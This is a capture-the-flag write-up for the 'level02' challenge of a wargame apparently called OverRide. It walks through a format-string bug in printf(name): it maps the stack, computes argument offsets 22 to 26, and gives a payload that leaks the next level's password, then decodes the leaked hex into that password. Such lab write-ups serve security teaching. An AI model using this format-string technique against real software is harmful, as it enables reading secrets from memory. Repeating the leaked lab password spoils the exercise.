# level02

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

<hr>

## Solution

From the [disassembled binary](./source.s) and the [source](./source.c) code, we can understand how the memory looks like:
```c
                                    <---- Higher addresses
-0x8(%rbp)     FILE *file;      // 8 bytes
-0xc(%rbp)     size_t ret;      // 4 bytes
-0x70(%rbp)    char name[100];
-0xa0(%rbp)    char token[48];
-0x110(%rbp)   char pass[112];
-0x114(%rbp)   4 bytes to save EDI
-0x120(%rbp)   12 bytes to save RSI <---- RSP here
                                    <---- Lower addresses
```

We know, that the `.pass` file read into local buffer of 48 bytes:
```c
    char token[48];
    ...
    file = fopen("/home/users/level03/.pass", "r");
    ...
    size_t ret = fread(token, 1, 41, file);
    ...
```

The next thing we can notice is vulnerable `printf` call:
```c
    ...
    if (strncmp(token, pass, 41) != 0) {
        printf(name);
        ...
```

Due to SysV calling conventions, first 6 argument are passed via `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9` registers, and the excessive argument passed via `stack`.

Each stack argument (address) on 64 bit system takes `8 bytes`.

Looking at the memory scheme above gives us the info about padding from stack pointer to token data:
```
RSP   = -0x120(%rbp) = 0x120
token = -0xa0(%rbp)  = 0xa0

0x120 - 0xa0 = 0x80 = 128 bytes

RSP + 128 bytes padding = token!
```

To make the padding, we need to skip `128 bytes / 8 bytes per stack argument` = 16 arguments.<br>
Do not forget about the first 6 args that passed via registers: `6 + 16 = 22` <br>
Now we can conclude, that `token` data started at 22nd argument.

As the `token` takes in 40 bytes + 1 `\n` or `\0` symbol, we can access it through `40 / 8 bytes` = 5 arguments.

So, arguments 22 - 26 contained the token when program runs.

Our format string is:
```
%22$lx %23$lx %24$lx %25$lx %26$lx
```

Now, let's get the data:
```bash
level02@OverRide:~$ echo '%22$lx %23$lx %24$lx %25$lx %26$lx' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
```

The last thing we need to do is convert the data from little-endian hex to big-endian ASCII text:
```python
print "\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + \
      "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + \
      "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + \
      "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + \
      "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1]
```

Aaand run!
```diff
level02@OverRide:~$ python /tmp/convert.py 
+ Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## References
- [Calling conventions, Sys-V](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)